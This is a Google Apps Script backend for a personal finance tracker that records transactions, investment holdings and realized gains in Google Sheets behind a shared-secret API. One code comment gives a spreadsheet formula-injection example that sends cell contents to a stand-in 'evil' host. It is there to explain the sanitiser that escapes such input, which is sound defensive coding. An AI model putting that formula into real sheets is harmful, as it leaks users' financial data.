/**
 * ============================================================
 *  PERSONAL FINANCE TRACKER — Google Apps Script Backend
 * ============================================================
 *  Acts as a REST API between your dashboard / Telegram bot
 *  and a Google Sheet that stores every transaction.
 *
 *  Endpoints (one Web App URL, routed by ?action=):
 *    GET  ?action=read                -> all transactions (JSON)
 *    GET  ?action=summary&period=...  -> aggregated totals (JSON)
 *    GET  ?action=holdings            -> investment holdings (JSON)
 *    GET  ?action=accounts            -> per-account balances (JSON)
 *    POST {action:"add", ...}         -> append one transaction
 *    POST {action:"transfer", ...}    -> move funds between two accounts (2 linked rows)
 *    POST {action:"delete", id:...}   -> remove a transaction by id
 *    POST {action:"addHolding", ...}  -> append one investment holding
 *    POST {action:"deleteHolding", id} -> remove a holding by id
 *    POST {action:"sellHolding", ...} -> sell (reduce) a holding + log income + realized P&L
 *    GET  ?action=realized            -> realized P&L rows + total
 *
 *  Security: a shared SECRET token must match on every request.
 * ============================================================
 */

// ---------- CONFIG ----------
var SHEET_NAME = 'Transactions';
var HOLDINGS_SHEET = 'Holdings';
var SECRET = 'YOUR_SECRET_STRING';   // must match the dashboard
// ----------------------------

// Column order in the sheet (row 1 = headers)
var HEADERS = ['id', 'date', 'type', 'category', 'description', 'amount', 'source', 'created_at', 'account'];

// Your savings accounts (the bot validates against this list, case-insensitive)
var ACCOUNTS = []; //add your Balance Account (AccountA | Account B)

// Holdings tab columns (row 1 = headers). 'id' added last so existing sheets still parse.
var HOLDINGS_HEADERS = ['asset_type', 'ticker', 'name', 'quantity', 'buy_price', 'buy_date', 'id'];

// Realized P&L tab (one row per sale)
var REALIZED_SHEET = 'Realized';
var REALIZED_HEADERS = ['id', 'date', 'asset_type', 'ticker', 'name', 'quantity',
                        'avg_buy_price', 'sell_price', 'proceeds', 'cost_basis',
                        'realized_pl', 'account'];

/** Entry point for GET requests */
function doGet(e) {
  try {
    var p = e.parameter || {};
    if (p.secret !== SECRET) return json_({ ok: false, error: 'Unauthorized' });

    var action = p.action || 'read';
    if (action === 'read')     return json_({ ok: true, data: getAllTransactions_() });
    if (action === 'summary')  return json_({ ok: true, data: getSummary_(p.period || 'monthly') });
    if (action === 'holdings') return json_({ ok: true, data: getHoldings_() });
    if (action === 'accounts') return json_({ ok: true, data: getAccountBalances_() });
    if (action === 'portfolio') return json_({ ok: true, data: getPortfolio_() });
    if (action === 'realized') return json_({ ok: true, data: getRealized_() });
    return json_({ ok: false, error: 'Unknown action: ' + action });
  } catch (err) {
    return json_({ ok: false, error: String(err) });
  }
}

/** Entry point for POST requests */
function doPost(e) {
  var lock = LockService.getScriptLock();
  lock.waitLock(20000);                    // prevent two writes colliding
  try {
    var body = JSON.parse(e.postData.contents || '{}');
    if (body.secret !== SECRET) return json_({ ok: false, error: 'Unauthorized' });

    var action = body.action;
    if (action === 'add')    return json_({ ok: true, data: addTransaction_(body) });
    if (action === 'transfer') return json_({ ok: true, data: addTransfer_(body) });
    if (action === 'delete') return json_({ ok: true, data: deleteTransaction_(body.id) });
    if (action === 'addHolding')    return json_({ ok: true, data: addHolding_(body) });
    if (action === 'deleteHolding') return json_({ ok: true, data: deleteHolding_(body.id) });
    if (action === 'sellHolding')   return json_({ ok: true, data: sellHolding_(body) });
    return json_({ ok: false, error: 'Unknown action: ' + action });
  } catch (err) {
    return json_({ ok: false, error: String(err) });
  } finally {
    lock.releaseLock();
  }
}

// ---------- CORE OPERATIONS ----------

function getSheet_() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sh = ss.getSheetByName(SHEET_NAME);
  if (!sh) {
    sh = ss.insertSheet(SHEET_NAME);
    sh.appendRow(HEADERS);
    sh.getRange(1, 1, 1, HEADERS.length).setFontWeight('bold');
    sh.setFrozenRows(1);
  }
  return sh;
}

function getAllTransactions_() {
  var sh = getSheet_();
  var values = sh.getDataRange().getValues();
  if (values.length < 2) return [];
  var rows = values.slice(1);             // drop header row
  return rows.filter(function (r) { return r[0] !== ''; }).map(function (r) {
    return {
      id:          r[0],
      date:        formatDate_(r[1]),
      type:        r[2],
      category:    r[3],
      description: r[4],
      amount:      Number(r[5]) || 0,
      source:      r[6] || 'web',
      account:     r[8] || 'Unassigned'
    };
  });
}

/** Text that starts with = + - or @ would be run by Sheets as a formula (for example
 *  =IMPORTDATA("https://evil/?"&A1) typed into a description or printed on a receipt).
 *  A leading apostrophe stores it as plain text instead. Numbers and Dates pass through. */
function safeCell_(v) {
  if (typeof v !== 'string') return v;
  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
}

function addTransaction_(b) {
  var sh = getSheet_();
  var id = 'TXN-' + new Date().getTime();   // unique, time-based id
  var row = [
    id,
    safeCell_(b.date || formatDate_(new Date())),
    safeCell_(b.type),                       // income | expense | invest
    safeCell_(b.category || 'Other'),
    safeCell_(b.description || ''),
    Number(b.amount) || 0,
    safeCell_(b.source || 'web'),            // web | telegram | whatsapp | ocr
    new Date(),
    safeCell_(b.account || '')               // AccountA | AccountB (blank = unassigned)
  ];
  sh.appendRow(row);
  return { id: id };
}

function addTransfer_(b) {
  // A transfer is two linked rows: money leaves 'from', enters 'to'.
  // Both use a 'transfer-*' type so the summary can exclude them from income/expense,
  // while per-account balances still net correctly.
  var sh = getSheet_();
  var amount = Number(b.amount) || 0;
  var date = safeCell_(b.date || formatDate_(new Date()));
  var note = b.description || '';
  var pairId = new Date().getTime();
  var outId = 'TRF-' + pairId + '-OUT';
  var inId  = 'TRF-' + pairId + '-IN';

  // OUT leg (debits the 'from' account) - behaves like an expense for balances
  sh.appendRow([outId, date, 'transfer-out', 'Transfer',
    safeCell_('To ' + b.toAccount + (note ? ' - ' + note : '')),
    amount, safeCell_(b.source || 'web'), new Date(), safeCell_(b.fromAccount || '')]);
  // IN leg (credits the 'to' account) - behaves like income for balances
  sh.appendRow([inId, date, 'transfer-in', 'Transfer',
    safeCell_('From ' + b.fromAccount + (note ? ' - ' + note : '')),
    amount, safeCell_(b.source || 'web'), new Date(), safeCell_(b.toAccount || '')]);

  return { outId: outId, inId: inId, amount: amount };
}

function deleteTransaction_(id) {
  var sh = getSheet_();
  var values = sh.getDataRange().getValues();
  for (var i = 1; i < values.length; i++) {
    if (values[i][0] === id) {
      sh.deleteRow(i + 1);                   // +1: sheet rows are 1-indexed
      return { deleted: id };
    }
  }
  return { deleted: null, note: 'id not found' };
}

// ---------- AGGREGATION ----------

function getSummary_(period) {
  var txns = getAllTransactions_();
  var now = new Date();
  var filtered = txns.filter(function (t) {
    var d = new Date(t.date);
    if (period === 'daily')     return sameDay_(d, now);
    if (period === 'monthly')   return d.getFullYear() === now.getFullYear() && d.getMonth() === now.getMonth();
    if (period === 'quarterly') return d.getFullYear() === now.getFullYear() && quarter_(d) === quarter_(now);
    if (period === 'yearly')    return d.getFullYear() === now.getFullYear();
    return true;
  });

  var sum = function (type) {
    return filtered.filter(function (t) { return t.type === type; })
                   .reduce(function (s, t) { return s + t.amount; }, 0);
  };
  var income = sum('income'), expense = sum('expense'), invest = sum('invest');

  // expense totals grouped by category (for the donut chart)
  var byCategory = {};
  filtered.filter(function (t) { return t.type === 'expense'; }).forEach(function (t) {
    byCategory[t.category] = (byCategory[t.category] || 0) + t.amount;
  });

  // per-account net flow this period: income & transfer-in add, expense/invest/transfer-out subtract
  var byAccount = {};
  filtered.forEach(function (t) {
    var acc = t.account || 'Unassigned';
    if (!byAccount[acc]) byAccount[acc] = { income: 0, expense: 0, invest: 0, net: 0 };
    if (t.type === 'income')       { byAccount[acc].income  += t.amount; byAccount[acc].net += t.amount; }
    if (t.type === 'expense')      { byAccount[acc].expense += t.amount; byAccount[acc].net -= t.amount; }
    if (t.type === 'invest')       { byAccount[acc].invest  += t.amount; byAccount[acc].net -= t.amount; }
    if (t.type === 'transfer-in')  { byAccount[acc].net += t.amount; }
    if (t.type === 'transfer-out') { byAccount[acc].net -= t.amount; }
  });

  return {
    period: period,
    income: income,
    expense: expense,
    invest: invest,
    net: income - expense - invest,
    savingsRate: income > 0 ? Math.round(((income - expense - invest) / income) * 100) : 0,
    count: filtered.length,
    byCategory: byCategory,
    byAccount: byAccount
  };
}

/** All-time net balance per account, across every row.
 *  income & transfer-in add to an account; expense, invest & transfer-out subtract. */
function getAccountBalances_() {
  var txns = getAllTransactions_();
  var bal = {};
  ACCOUNTS.forEach(function (a) { bal[a] = 0; });   // seed known accounts at 0
  txns.forEach(function (t) {
    var acc = t.account || 'Unassigned';
    if (bal[acc] === undefined) bal[acc] = 0;
    if (t.type === 'income' || t.type === 'transfer-in') {
      bal[acc] += t.amount;                          // money in
    } else {
      bal[acc] -= t.amount;                          // expense, invest, transfer-out: money out
    }
  });
  return { accounts: ACCOUNTS, balances: bal };
}

// ---------- HELPERS ----------

function json_(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj))
                       .setMimeType(ContentService.MimeType.JSON);
}
function formatDate_(d) {
  if (!(d instanceof Date)) d = new Date(d);
  return Utilities.formatDate(d, Session.getScriptTimeZone(), 'yyyy-MM-dd');
}
function sameDay_(a, b) {
  return a.getFullYear() === b.getFullYear() && a.getMonth() === b.getMonth() && a.getDate() === b.getDate();
}
function quarter_(d) { return Math.floor(d.getMonth() / 3); }

// ---------- HOLDINGS ----------

/** Read the Holdings tab and return one object per position. */
function getHoldings_() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sh = ss.getSheetByName(HOLDINGS_SHEET);
  if (!sh) return [];
  var values = sh.getDataRange().getValues();
  if (values.length < 2) return [];
  return values.slice(1)
    .filter(function (r) { return r[0] !== '' && r[3] !== ''; })  // need asset_type + quantity
    .map(function (r) {
      return {
        assetType: String(r[0]).toLowerCase().trim(),  // 'gold' or 'stock'
        ticker:    String(r[1]).toUpperCase().trim(),   // e.g. BBCA (blank for gold)
        name:      r[2] || '',
        quantity:  Number(r[3]) || 0,                   // shares, or grams for gold
        buyPrice:  Number(r[4]) || 0,                   // price per share / per gram
        buyDate:   r[5] ? formatDate_(r[5]) : '',
        id:        r[6] || ''                            // stable row id (blank on legacy rows)
      };
    });
}

// ---------- HOLDINGS WRITE ----------

/** Get (or create) the Holdings sheet with headers. */
function getHoldingsSheet_() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sh = ss.getSheetByName(HOLDINGS_SHEET);
  if (!sh) {
    sh = ss.insertSheet(HOLDINGS_SHEET);
    sh.appendRow(HOLDINGS_HEADERS);
    sh.getRange(1, 1, 1, HOLDINGS_HEADERS.length).setFontWeight('bold');
    sh.setFrozenRows(1);
  }
  return sh;
}

/** Add one holding. Returns its new id. */
function addHolding_(b) {
  var sh = getHoldingsSheet_();
  var id = 'HLD-' + new Date().getTime();
  sh.appendRow([
    safeCell_(String(b.assetType || '').toLowerCase().trim()),   // gold | stock
    safeCell_(String(b.ticker || '').toUpperCase().trim()),       // blank for gold
    safeCell_(b.name || ''),
    Number(b.quantity) || 0,                           // grams (gold) or shares
    Number(b.buyPrice) || 0,                           // per gram / per share
    safeCell_(b.buyDate || formatDate_(new Date())),
    id
  ]);
  return { id: id };
}

/** Delete one holding by id. */
function deleteHolding_(id) {
  var sh = getHoldingsSheet_();
  var values = sh.getDataRange().getValues();
  for (var i = 1; i < values.length; i++) {
    if (values[i][6] === id) {           // id is column 7 (index 6)
      sh.deleteRow(i + 1);
      return { deleted: id };
    }
  }
  return { deleted: null, note: 'id not found' };
}

// ---------- SELL A HOLDING ----------
//
// A sale does three linked things:
//   1. reduce (or remove) the holding quantity
//   2. log the cash proceeds as an income transaction to an account
//   3. record realized P&L (proceeds - cost basis) on the Realized tab
//
// Two modes:
//   - by lot id:   sell from one specific holding row (body.id, body.quantity)
//   - by ticker:   sell a quantity of a ticker, drawing across its lots FIFO
//                  (body.ticker OR body.name, body.quantity)
// Common fields: body.sellPrice (per unit), body.account, body.date.

function sellHolding_(b) {
  var sh = getHoldingsSheet_();
  var values = sh.getDataRange().getValues();   // includes header row
  var sellQty = Number(b.quantity) || 0;
  var sellPrice = Number(b.sellPrice) || 0;
  if (sellQty <= 0 || sellPrice <= 0) {
    return { error: 'quantity and sellPrice must be positive' };
  }

  // collect matching lots (row index, qty, buyPrice, meta)
  var lots = [];
  var assetType = '', ticker = '', name = '';
  for (var i = 1; i < values.length; i++) {
    var r = values[i];
    if (r[0] === '' || Number(r[3]) <= 0) continue;
    var match = false;
    if (b.id) {
      match = (r[6] === b.id);
    } else {
      // If both ticker AND name given, require BOTH to match — this lets gold
      // disambiguate brands (e.g. ticker 'LM' name 'Antam' vs 'UBS').
      var rTicker = String(r[1]).toUpperCase().trim();
      var rName = String(r[2]).toLowerCase().trim();
      var bTicker = b.ticker ? String(b.ticker).toUpperCase().trim() : '';
      var bName = b.name ? String(b.name).toLowerCase().trim() : '';
      if (bTicker && bName) {
        match = (rTicker === bTicker && rName === bName);
      } else if (bTicker) {
        match = (rTicker === bTicker);
      } else if (bName) {
        match = (rName === bName);
      }
    }
    if (match) {
      lots.push({ rowIndex: i + 1, qty: Number(r[3]), buyPrice: Number(r[4]) });
      assetType = r[0]; ticker = r[1]; name = r[2];
    }
  }

  if (!lots.length) return { error: 'no matching holding found' };

  var available = lots.reduce(function (s, l) { return s + l.qty; }, 0);
  if (sellQty > available + 1e-9) {
    return { error: 'selling ' + sellQty + ' but only ' + available + ' held' };
  }

  // draw down lots FIFO, accumulating cost basis of the sold units
  var remaining = sellQty;
  var costBasis = 0;
  for (var j = 0; j < lots.length && remaining > 1e-9; j++) {
    var lot = lots[j];
    var take = Math.min(lot.qty, remaining);
    costBasis += take * lot.buyPrice;
    var newQty = lot.qty - take;
    remaining -= take;
    if (newQty <= 1e-9) {
      sh.getRange(lot.rowIndex, 4).setValue(0);   // mark emptied; cleaned below
    } else {
      sh.getRange(lot.rowIndex, 4).setValue(newQty);  // reduce quantity in place
    }
  }
  // remove any lots that hit zero (delete from bottom up to keep indices valid)
  var toDelete = [];
  var refreshed = sh.getDataRange().getValues();
  for (var k = 1; k < refreshed.length; k++) {
    if (refreshed[k][0] !== '' && Number(refreshed[k][3]) <= 0) toDelete.push(k + 1);
  }
  toDelete.sort(function (a, b2) { return b2 - a; }).forEach(function (rowNum) {
    sh.deleteRow(rowNum);
  });

  var proceeds = sellQty * sellPrice;
  var avgBuy = costBasis / sellQty;
  var realizedPl = proceeds - costBasis;
  var date = b.date || formatDate_(new Date());
  var account = b.account || '';
  var label = name || ticker || assetType;

  // 2. income transaction for the cash proceeds (tagged 'Asset Sale')
  addTransaction_({
    type: 'income', category: 'Asset Sale',
    description: 'Sold ' + sellQty + ' ' + label +
                 ' @ ' + sellPrice + (realizedPl >= 0 ? ' (gain)' : ' (loss)'),
    amount: proceeds, date: date, account: account, source: b.source || 'web'
  });

  // 3. realized P&L row
  var realizedSheet = getRealizedSheet_();
  realizedSheet.appendRow([
    'RLZ-' + new Date().getTime(), safeCell_(date), safeCell_(assetType), safeCell_(ticker), safeCell_(name),
    sellQty, avgBuy, sellPrice, proceeds, costBasis, realizedPl, safeCell_(account)
  ]);

  return {
    sold: sellQty, label: label, proceeds: proceeds,
    avgBuyPrice: avgBuy, sellPrice: sellPrice,
    costBasis: costBasis, realizedPl: realizedPl, account: account
  };
}

/** Get (or create) the Realized P&L sheet. */
function getRealizedSheet_() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sh = ss.getSheetByName(REALIZED_SHEET);
  if (!sh) {
    sh = ss.insertSheet(REALIZED_SHEET);
    sh.appendRow(REALIZED_HEADERS);
    sh.getRange(1, 1, 1, REALIZED_HEADERS.length).setFontWeight('bold');
    sh.setFrozenRows(1);
  }
  return sh;
}

/** Read all realized P&L rows + a total. */
function getRealized_() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sh = ss.getSheetByName(REALIZED_SHEET);
  if (!sh) return { rows: [], totalRealized: 0 };
  var values = sh.getDataRange().getValues();
  if (values.length < 2) return { rows: [], totalRealized: 0 };
  var rows = values.slice(1).filter(function (r) { return r[0] !== ''; }).map(function (r) {
    return {
      id: r[0], date: formatDate_(r[1]), assetType: r[2], ticker: r[3], name: r[4],
      quantity: Number(r[5]) || 0, avgBuyPrice: Number(r[6]) || 0,
      sellPrice: Number(r[7]) || 0, proceeds: Number(r[8]) || 0,
      costBasis: Number(r[9]) || 0, realizedPl: Number(r[10]) || 0, account: r[11] || ''
    };
  });
  var total = rows.reduce(function (s, x) { return s + x.realizedPl; }, 0);
  return { rows: rows, totalRealized: total };
}

// ---------- PORTFOLIO P&L (server-side prices) ----------

/** Live stock price for an IDX ticker via Yahoo (server-side, no CORS). */
function getStockPrice_(ticker) {
  var t = ticker.indexOf('.') >= 0 ? ticker : ticker + '.JK';
  var url = 'https://query1.finance.yahoo.com/v8/finance/chart/' + t +
            '?interval=1d&range=1d';
  try {
    var resp = UrlFetchApp.fetch(url, {
      muteHttpExceptions: true,
      headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*' }
    });
    var data = JSON.parse(resp.getContentText());
    var price = data.chart.result[0].meta.regularMarketPrice;
    return { price: Number(price) || null, source: 'Yahoo Finance (delayed)' };
  } catch (err) {
    return { price: null, source: 'yahoo', error: String(err) };
  }
}

/** Live Antam 1g buyback price, scraped server-side from antaremas.com. */
function getGoldBuyback_() {
  try {
    var resp = UrlFetchApp.fetch('https://antaremas.com/harga-emas/', {
      muteHttpExceptions: true, headers: { 'User-Agent': 'Mozilla/5.0' }
    });
    var html = resp.getContentText().replace(/\s+/g, ' ');
    // Anchor on the "Buyback per 1 Gr" row so we don't grab 50/100gr or Retro
    var m = html.match(/Buyback\s*per\s*1\s*Gr\b.*?Rp\.?\s*([\d\.]{7,})/i);
    if (!m) m = html.match(/Buyback\b.*?Rp\.?\s*([\d\.]{7,})/i);
    if (m) {
      var val = Number(m[1].replace(/\./g, ''));
      if (val >= 500000 && val <= 50000000)
        return { price: val, source: 'antaremas.com (Antam buyback 1gr)' };
    }
  } catch (err) {
    return { price: null, source: 'antam', error: String(err) };
  }
  return { price: null, source: 'antam', error: 'buyback value not found' };
}

/** Build portfolio P&L: pulls holdings, fetches live prices, computes gains. */
function getPortfolio_() {
  var holdings = getHoldings_();
  var positions = [];
  var goldPrice = null;
  var totalCost = 0, totalValue = 0;

  holdings.forEach(function (h) {
    var qty = h.quantity, buy = h.buyPrice, cost = qty * buy;
    var cur = null, src = '';
    if (h.assetType === 'gold') {
      if (goldPrice === null) goldPrice = getGoldBuyback_();
      cur = goldPrice.price; src = goldPrice.source;
    } else if (h.assetType === 'stock') {
      var q = getStockPrice_(h.ticker);
      cur = q.price; src = q.source;
    }
    var value = null, pl = null, plPct = null;
    if (cur !== null) {
      value = qty * cur; pl = value - cost;
      plPct = cost ? (pl / cost * 100) : 0;
      totalCost += cost; totalValue += value;
    }
    positions.push({
      id: h.id, assetType: h.assetType,
      label: h.name || h.ticker || h.assetType, ticker: h.ticker,
      quantity: qty, buyPrice: buy, currentPrice: cur,
      cost: cost, value: value, pl: pl, plPct: plPct, source: src
    });
  });

  var totalPl = totalValue - totalCost;
  return {
    positions: positions,
    totals: {
      cost: totalCost, value: totalValue, pl: totalPl,
      plPct: totalCost ? (totalPl / totalCost * 100) : 0
    }
  };
}

// ---------- ONE-TIME SETUP (run manually once) ----------

/** Run this once from the editor to create both tabs + seed sample rows. */
function setup() {
  var sh = getSheet_();
  if (sh.getLastRow() < 2) {
    addTransaction_({ type: 'income', category: 'Salary', description: 'Gaji Bulanan',
                      amount: 12000000, date: formatDate_(new Date()), source: 'web' });
  }

  // create the Holdings tab (with id column) + two example rows
  var hsh = getHoldingsSheet_();
  if (hsh.getLastRow() < 2) {
    addHolding_({ assetType: 'stock', ticker: 'BBCA', name: 'Bank Central Asia',
                  quantity: 100, buyPrice: 9500 });
    addHolding_({ assetType: 'gold', ticker: 'LM', name: 'Antam',
                  quantity: 5, buyPrice: 1200000 });
  }

  getRealizedSheet_();   // ensure the Realized P&L tab exists

  Logger.log('Setup complete. Tabs "' + SHEET_NAME + '", "' + HOLDINGS_SHEET +
             '" and "' + REALIZED_SHEET + '" are ready.');
}